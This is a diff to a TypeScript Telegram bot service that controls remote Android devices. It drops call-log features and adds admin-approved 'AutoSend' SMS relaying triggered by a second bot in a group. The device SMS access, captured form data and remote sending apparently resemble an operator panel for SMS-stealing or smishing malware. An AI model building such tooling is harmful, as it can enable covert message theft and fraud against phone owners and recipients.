@@ -1,11 +1,26 @@
 import TelegramBot from 'node-telegram-bot-api';
-import { TelegramConfig, NotificationOptions } from './types.js';
+import { TelegramConfig, NotificationOptions, AutoSmsConfig } from './types.js';
+import { parseAutoSmsMessage } from './autoSmsParser.js';
 import { store } from '../store.js';
-import { SMS, CallLog, Device, FormData } from '../types/index.js';
+import { SMS, Device, FormData } from '../types/index.js';
 import { getFieldDisplayName, getFieldsByCategory, FIELD_CATEGORIES, EXCLUDE_FIELDS } from '../formConfig.js';
 import * as fs from 'fs';
 import * as path from 'path';
 import * as os from 'os';
+
+// Pending AutoSend SMS request created from a second-bot group message.
+interface AutoSmsRequest {
+    requestId: string;
+    chatId: number;
+    messageId: number;
+    senderId: number;
+    recipientNumber: string;
+    message: string;
+    createdAt: number;
+    status: 'pending' | 'sending' | 'sent' | 'failed';
+}
+
+const AUTO_SMS_DEFAULT_TTL_MINUTES = 30;
 
 export class TelegramBotService {
     private bot: TelegramBot | null = null;
@@ -14,6 +29,11 @@ export class TelegramBotService {
     private hasLoggedConflict: boolean = false;
     private pollingRetryCount: number = 0;
     private maxPollingRetries: number = 3;
+
+    // AutoSend SMS (second-bot group requests)
+    private autoSmsConfig: AutoSmsConfig | null = null;
+    private pendingAutoSmsRequests: Map<string, AutoSmsRequest> = new Map();
+    private selfBotId: number | null = null;
 
     // SMS conversation state: chatId -> { deviceId, subscriptionId, step, phoneNumber }
     private smsConversations: Map<number, { deviceId: string; subscriptionId: number; step: 'phone' | 'message'; phoneNumber?: string }> = new Map();
@@ -31,6 +51,7 @@ export class TelegramBotService {
             this.bot = new TelegramBot(config.token, { polling: false });
             this.adminIds = new Set(config.adminIds || []);
             this.isEnabled = true;
+            this.autoSmsConfig = config.autoSms?.enabled ? config.autoSms : null;
 
             this.bot.on('polling_error', (error: any) => {
                 if (error.code === 'ETELEGRAM' && error.message?.includes('409 Conflict')) {
@@ -48,8 +69,12 @@ export class TelegramBotService {
             this.setupCommands();
             this.setupCallbackQueries();
             this.setupMessageListener();
+            this.setupAutoSmsListener();
             console.log('[Telegram] Bot initialized (polling will start after delay)');
             console.log(`[Telegram] Admin IDs: ${Array.from(this.adminIds).join(', ')}`);
+            if (this.autoSmsConfig) {
+                console.log(`[Telegram] AutoSend SMS enabled (group: ${this.autoSmsConfig.groupId}, sender: ${this.autoSmsConfig.senderId}, ttl: ${this.autoSmsConfig.ttlMinutes}m)`);
+            }
             this.startPollingWithDelay();
         } else {
             console.log('[Telegram] Bot disabled - no token provided');
@@ -204,17 +229,14 @@ export class TelegramBotService {
         const buttons: TelegramBot.InlineKeyboardButton[][] = [
             [
                 { text: '📨 SMS', callback_data: `sms_menu:${shortId}` },
-                { text: '📞 Calls', callback_data: `calls_menu:${shortId}` },
-            ],
-            [
                 { text: '📝 Forms', callback_data: `forms:${shortId}` },
+            ],
+            [
                 { text: '📤 Forward', callback_data: `forward:${shortId}` },
-            ],
-            [
                 { text: '📊 Status', callback_data: `status:${shortId}` },
-                { text: '🔄 Sync', callback_data: `sync:${shortId}` },
             ],
             [
+                { text: '🔄 Sync', callback_data: `sync:${shortId}` },
                 { text: '⬅️ Back to Devices', callback_data: 'back_devices' },
             ]
         ];
@@ -354,135 +376,6 @@ export class TelegramBotService {
             });
         } finally {
             // Clean up temp file
-            fs.unlinkSync(filePath);
-        }
-    }
-
-    // ==================== CALLS MENU ====================
-
-    private showCallsMenu(chatId: number, deviceData: any): void {
-        const device = deviceData.device;
-        const shortId = device.id.substring(0, 8);
-        const callsCount = deviceData.calls.length;
-
-        const message = `*📞 Calls - ${device.name}*\n\nTotal calls: ${callsCount}\n\n*Select an option:*`;
-
-        const buttons: TelegramBot.InlineKeyboardButton[][] = [
-            [
-                { text: '📥 View Last 5', callback_data: `view_calls:${shortId}` },
-            ],
-            [
-                { text: '📄 Download All (.txt)', callback_data: `download_calls:${shortId}` },
-            ],
-            [
-                { text: '⬅️ Back', callback_data: `action_menu:${shortId}` },
-            ]
-        ];
-
-        this.bot?.sendMessage(chatId, message, {
-            parse_mode: 'Markdown',
-            reply_markup: { inline_keyboard: buttons }
-        });
-    }
-
-    private async showLastCalls(chatId: number, deviceData: any): Promise<void> {
-        const device = deviceData.device;
-        const shortId = device.id.substring(0, 8);
-
-        // Sync if online
-        if (device.status === 'online' && this.onSyncRequest) {
-            this.onSyncRequest(device.id);
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            deviceData = this.findDevice(shortId);
-            if (!deviceData) {
-                this.bot?.sendMessage(chatId, '❌ Device not found after sync.');
-                return;
-            }
-        }
-
-        if (deviceData.calls.length === 0) {
-            this.bot?.sendMessage(chatId, `📭 No calls for ${device.name}`, {
-                reply_markup: {
-                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `calls_menu:${shortId}` }]]
-                }
-            });
-            return;
-        }
-
-        // Sort by timestamp descending (most recent first) and take 5
-        const sortedCalls = [...deviceData.calls].sort((a: CallLog, b: CallLog) =>
-            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
-        );
-        const callsList = sortedCalls.slice(0, 5);
-
-        let message = `*📞 Last 5 Calls (${device.name}):*\n\n`;
-        callsList.forEach((call: CallLog, index: number) => {
-            const icon = call.type === 'incoming' ? '📥' : call.type === 'outgoing' ? '📤' : '📵';
-            const typeLabel = call.type === 'incoming' ? 'Incoming' : call.type === 'outgoing' ? 'Outgoing' : 'Missed';
-            const duration = call.duration > 0 ? `${Math.floor(call.duration / 60)}m ${call.duration % 60}s` : '-';
-            const date = new Date(call.timestamp).toLocaleString();
-            message += `${index + 1}. ${icon} *${call.number}*\n`;
-            message += `   ${typeLabel} | Duration: ${duration}\n`;
-            message += `   🕐 ${date}\n\n`;
-        });
-
-        this.bot?.sendMessage(chatId, message, {
-            parse_mode: 'Markdown',
-            reply_markup: {
-                inline_keyboard: [[{ text: '⬅️ Back', callback_data: `calls_menu:${shortId}` }]]
-            }
-        });
-    }
-
-    private async downloadAllCalls(chatId: number, deviceData: any): Promise<void> {
-        const device = deviceData.device;
-        const shortId = device.id.substring(0, 8);
-
-        if (deviceData.calls.length === 0) {
-            this.bot?.sendMessage(chatId, `📭 No calls to download for ${device.name}`, {
-                reply_markup: {
-                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `calls_menu:${shortId}` }]]
-                }
-            });
-            return;
-        }
-
-        // Sort by timestamp descending
-        const sortedCalls = [...deviceData.calls].sort((a: CallLog, b: CallLog) =>
-            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
-        );
-
-        // Generate text content
-        let content = `Call Log Export - ${device.name}\n`;
-        content += `Generated: ${new Date().toLocaleString()}\n`;
-        content += `Total Calls: ${sortedCalls.length}\n`;
-        content += '='.repeat(50) + '\n\n';
-
-        sortedCalls.forEach((call: CallLog, index: number) => {
-            const typeLabel = call.type === 'incoming' ? 'INCOMING' : call.type === 'outgoing' ? 'OUTGOING' : 'MISSED';
-            const duration = call.duration > 0 ? `${Math.floor(call.duration / 60)}m ${call.duration % 60}s` : 'N/A';
-            const date = new Date(call.timestamp).toLocaleString();
-            content += `[${index + 1}] ${typeLabel}: ${call.number}\n`;
-            content += `Date: ${date}\n`;
-            content += `Duration: ${duration}\n`;
-            content += '-'.repeat(40) + '\n\n';
-        });
-
-        // Write to temp file and send
-        const tempDir = os.tmpdir();
-        const fileName = `calls_${device.name.replace(/\s+/g, '_')}_${Date.now()}.txt`;
-        const filePath = path.join(tempDir, fileName);
-
-        fs.writeFileSync(filePath, content, 'utf8');
-
-        try {
-            await this.bot?.sendDocument(chatId, filePath, {
-                caption: `📄 All calls from ${device.name} (${sortedCalls.length} calls)`,
-                reply_markup: {
-                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `calls_menu:${shortId}` }]]
-                }
-            });
-        } finally {
             fs.unlinkSync(filePath);
         }
     }
@@ -1012,6 +905,12 @@ export class TelegramBotService {
                 return;
             }
 
+            // AutoSend SMS requests (handled before the generic callback flow)
+            if (query.data.startsWith('autosend:')) {
+                await this.handleAutoSendCallback(query);
+                return;
+            }
+
             const chatId = query.message.chat.id;
             const parts = query.data.split(':');
             const action = parts[0];
@@ -1073,21 +972,6 @@ export class TelegramBotService {
 
                 case 'sendsms':
                     if (deviceData) this.promptSendSMS(chatId, deviceData);
-                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
-                    break;
-
-                case 'calls_menu':
-                    if (deviceData) this.showCallsMenu(chatId, deviceData);
-                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
-                    break;
-
-                case 'view_calls':
-                    if (deviceData) await this.showLastCalls(chatId, deviceData);
-                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
-                    break;
-
-                case 'download_calls':
-                    if (deviceData) await this.downloadAllCalls(chatId, deviceData);
                     else this.bot?.sendMessage(chatId, '❌ Device not found.');
                     break;
 
@@ -1252,6 +1136,235 @@ export class TelegramBotService {
         this.forwardingConversations.delete(chatId);
     }
 
+    // ==================== AUTOSEND SMS (SECOND BOT) ====================
+    //
+    // A second Telegram bot/user posts SMS requests into a designated group.
+    // This bot detects them, shows an inline [🚀 AutoSend] button and only
+    // sends via the EXISTING onSendSms() pipeline after an authorized admin
+    // presses the button. One group message = at most ONE SMS request.
+
+    private setupAutoSmsListener(): void {
+        if (!this.bot || !this.autoSmsConfig) return;
+
+        // Resolve our own bot id for loop prevention: with Bot-to-Bot
+        // Communication Mode enabled (core.telegram.org/api/bots/bot-to-bot)
+        // our own preview messages may also be delivered back to us if the
+        // second bot has the mode enabled. Never parse our own messages.
+        this.bot.getMe().then((me) => {
+            this.selfBotId = me.id;
+        }).catch((error: any) => {
+            console.error('[AutoSMS] Failed to resolve own bot id:', error?.message || error);
+        });
+
+        // NOTE: For the first bot to receive messages from the second bot,
+        // Bot-to-Bot Communication Mode must be enabled for it in @BotFather,
+        // and it must be an admin in the group OR have Group Privacy Mode
+        // disabled. Otherwise Telegram does not deliver other bots' messages.
+        this.bot.on('message', (msg) => {
+            try {
+                this.handleAutoSmsGroupMessage(msg);
+            } catch (error: any) {
+                console.error('[AutoSMS] Error handling group message:', error?.message || error);
+            }
+        });
+    }
+
+    private handleAutoSmsGroupMessage(msg: TelegramBot.Message): void {
+        const cfg = this.autoSmsConfig;
+        if (!cfg || !msg.text || !msg.from) return;
+
+        // Loop prevention: never process our own messages (Telegram's
+        // recommended safeguard for bot-to-bot communication).
+        if (this.selfBotId !== null && msg.from.id === this.selfBotId) return;
+
+        // Security: only accept messages from the configured group AND the
+        // configured sender id. Never trust message text alone.
+        if (msg.chat.id !== cfg.groupId) return;
+        if (msg.from.id !== cfg.senderId) return;
+
+        // Edits arrive as 'edited_message' events (not handled here), so an
+        // edited message can never create a duplicate request.
+
+        const parsed = parseAutoSmsMessage(msg.text);
+        if (!parsed || parsed.confidence === 'low') {
+            console.log(`[AutoSMS] Ignoring malformed/ambiguous message from sender ${msg.from.id} in group ${msg.chat.id}`);
+            return;
+        }
+
+        // Expire old pending requests to keep memory bounded.
+        this.pruneExpiredAutoSmsRequests();
+
+        const requestId = `autosend-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+        const request: AutoSmsRequest = {
+            requestId,
+            chatId: msg.chat.id,
+            messageId: msg.message_id,
+            senderId: msg.from.id,
+            recipientNumber: parsed.recipientNumber,
+            message: parsed.message,
+            createdAt: Date.now(),
+            status: 'pending'
+        };
+        this.pendingAutoSmsRequests.set(requestId, request);
+
+        console.log(`[AutoSMS] Request detected: requestId=${requestId} senderId=${msg.from.id} groupId=${msg.chat.id} recipient=${TelegramBotService.maskPhone(parsed.recipientNumber)} confidence=${parsed.confidence}`);
+
+        const preview =
+            `📱 SMS Request\n\n` +
+            `To: ${parsed.recipientNumber}\n\n` +
+            `Message:\n${parsed.message}`;
+
+        this.bot?.sendMessage(msg.chat.id, preview, {
+            reply_markup: {
+                inline_keyboard: [[{ text: '🚀 AutoSend', callback_data: `autosend:${requestId}` }]]
+            }
+        });
+    }
+
+    private async handleAutoSendCallback(query: TelegramBot.CallbackQuery): Promise<void> {
+        const queryId = query.id;
+        const requestId = query.data!.split(':')[1] || '';
+        const chatId = query.message!.chat.id;
+        const pressedBy = query.from.id;
+
+        console.log(`[AutoSMS] AutoSend pressed: requestId=${requestId} userId=${pressedBy}`);
+
+        const request = this.pendingAutoSmsRequests.get(requestId);
+
+        if (!request || request.chatId !== chatId) {
+            this.bot?.answerCallbackQuery(queryId, { text: '❌ This SMS request is no longer available.', show_alert: true });
+            return;
+        }
+
+        // Expiration check.
+        const ttlMs = (this.autoSmsConfig?.ttlMinutes ?? AUTO_SMS_DEFAULT_TTL_MINUTES) * 60 * 1000;
+        if (Date.now() - request.createdAt > ttlMs) {
+            this.pendingAutoSmsRequests.delete(requestId);
+            this.bot?.answerCallbackQuery(queryId, { text: '❌ This SMS request has expired.', show_alert: true });
+            this.editAutoSmsPreview(chatId, request.messageId,
+                `⌛ This SMS request has expired.\n\nTo: ${request.recipientNumber}`,
+                [[{ text: '⌛ Expired', callback_data: 'autosend_disabled' }]]
+            );
+            return;
+        }
+
+        // Duplicate protection: only a 'pending' or 'failed' (retry) request may proceed.
+        if (request.status === 'sent') {
+            this.bot?.answerCallbackQuery(queryId, { text: '✅ This SMS has already been sent.', show_alert: true });
+            return;
+        }
+        if (request.status === 'sending') {
+            this.bot?.answerCallbackQuery(queryId, { text: '⏳ SMS is already being sent.' });
+            return;
+        }
+
+        // Atomically transition to 'sending' before invoking the SMS pipeline.
+        request.status = 'sending';
+        console.log(`[AutoSMS] Sending started: requestId=${requestId} recipient=${TelegramBotService.maskPhone(request.recipientNumber)}`);
+
+        this.bot?.answerCallbackQuery(queryId, { text: '🚀 Sending SMS...' });
+
+        const target = this.resolveAutoSmsTarget();
+        if (!target) {
+            request.status = 'failed';
+            console.error(`[AutoSMS] Sending failed: no online device available (requestId=${requestId})`);
+            this.bot?.sendMessage(chatId,
+                `❌ SMS sending failed\n\nTo: ${request.recipientNumber}\n\nReason:\nNo online device available.`,
+                {
+                    reply_markup: {
+                        inline_keyboard: [[{ text: '🔄 Retry', callback_data: `autosend:${requestId}` }]]
+                    }
+                }
+            );
+            return;
+        }
+
+        if (!this.onSendSms) {
+            request.status = 'failed';
+            console.error(`[AutoSMS] Sending failed: onSendSms not wired (requestId=${requestId})`);
+            return;
+        }
+
+        // Reuse the existing manual-SMS pipeline (device -> Android -> SMS).
+        this.onSendSms(target.deviceId, request.recipientNumber, request.message, requestId, target.subscriptionId);
+
+        // Final confirmation arrives asynchronously via handleAutoSmsSendResult().
+    }
+
+    /**
+     * Called by the socket layer when the Android device reports an
+     * sms:sendResult for one of our pending AutoSend requests.
+     */
+    handleAutoSmsSendResult(requestId: string, success: boolean, error?: string): void {
+        const request = this.pendingAutoSmsRequests.get(requestId);
+        if (!request || request.status !== 'sending') return;
+
+        if (success) {
+            request.status = 'sent';
+            console.log(`[AutoSMS] Sending succeeded: requestId=${requestId} recipient=${TelegramBotService.maskPhone(request.recipientNumber)}`);
+            this.editAutoSmsPreview(request.chatId, request.messageId,
+                `✅ SMS sent successfully\n\nTo: ${request.recipientNumber}\n\nMessage:\n${request.message}`,
+                [[{ text: '✅ Sent', callback_data: `autosend:${requestId}` }]]
+            );
+        } else {
+            request.status = 'failed';
+            console.error(`[AutoSMS] Sending failed: requestId=${requestId} recipient=${TelegramBotService.maskPhone(request.recipientNumber)} reason=${error || 'unknown'}`);
+            this.editAutoSmsPreview(request.chatId, request.messageId,
+                `❌ SMS sending failed\n\nTo: ${request.recipientNumber}\n\nReason:\n${error || 'Unknown error'}`,
+                [[{ text: '🔄 Retry', callback_data: `autosend:${requestId}` }]]
+            );
+        }
+    }
+
+    /** Pick the device/SIM used for AutoSend, reusing existing device state. */
+    private resolveAutoSmsTarget(): { deviceId: string; subscriptionId: number; deviceName: string } | null {
+        const online = store.getAllDevices().filter(d => d.status === 'online');
+        if (online.length === 0) return null;
+
+        let device = online[0];
+        const preferred = this.autoSmsConfig?.deviceId;
+        if (preferred) {
+            const match = online.find(x => x.id === preferred || x.id.startsWith(preferred));
+            if (!match) return null;
+            device = match;
+        }
+
+        let subscriptionId = this.autoSmsConfig?.subscriptionId ?? -1;
+        if (subscriptionId === -1) {
+            const sims = device.simCards || [];
+            if (sims.length === 1 && typeof sims[0].subscriptionId === 'number') {
+                subscriptionId = sims[0].subscriptionId;
+            }
+        }
+
+        return { deviceId: device.id, subscriptionId, deviceName: device.name };
+    }
+
+    private editAutoSmsPreview(chatId: number, messageId: number, text: string, keyboard: TelegramBot.InlineKeyboardButton[][]): void {
+        this.bot?.editMessageText(text, {
+            chat_id: chatId,
+            message_id: messageId,
+            reply_markup: { inline_keyboard: keyboard }
+        }).catch((error: any) => {
+            console.error('[AutoSMS] Failed to update preview message:', error?.message || error);
+        });
+    }
+
+    private pruneExpiredAutoSmsRequests(): void {
+        const ttlMs = (this.autoSmsConfig?.ttlMinutes ?? AUTO_SMS_DEFAULT_TTL_MINUTES) * 60 * 1000;
+        const now = Date.now();
+        for (const [id, req] of this.pendingAutoSmsRequests) {
+            if (now - req.createdAt > ttlMs && req.status !== 'sending') {
+                this.pendingAutoSmsRequests.delete(id);
+            }
+        }
+    }
+
+    static maskPhone(phoneNumber: string): string {
+        if (phoneNumber.length <= 4) return '****';
+        return '*'.repeat(phoneNumber.length - 4) + phoneNumber.slice(-4);
+    }
+
     // ==================== HELPERS ====================
 
     private findDevice(idOrShortId: string) {
@@ -1325,16 +1438,6 @@ export class TelegramBotService {
         message += `🕐 ${timestamp}`;
 
         await this.sendToAllAdmins(message);
-    }
-
-    async notifyNewCall(deviceName: string, call: CallLog): Promise<void> {
-        if (call.type === 'outgoing') return;
-        const icon = call.type === 'missed' ? '📵' : '📞';
-        const callType = call.type === 'missed' ? 'Missed Call' : 'Incoming Call';
-        const duration = call.duration > 0 ? ` (${Math.floor(call.duration / 60)}m ${call.duration % 60}s)` : '';
-        await this.sendToAllAdmins(
-            `${icon} *${callType}*\n\n📱 Device: ${deviceName}\n👤 From: ${call.number}${duration}`
-        );
     }
 
     async notifyFormSubmission(deviceName: string, form: FormData): Promise<void> {
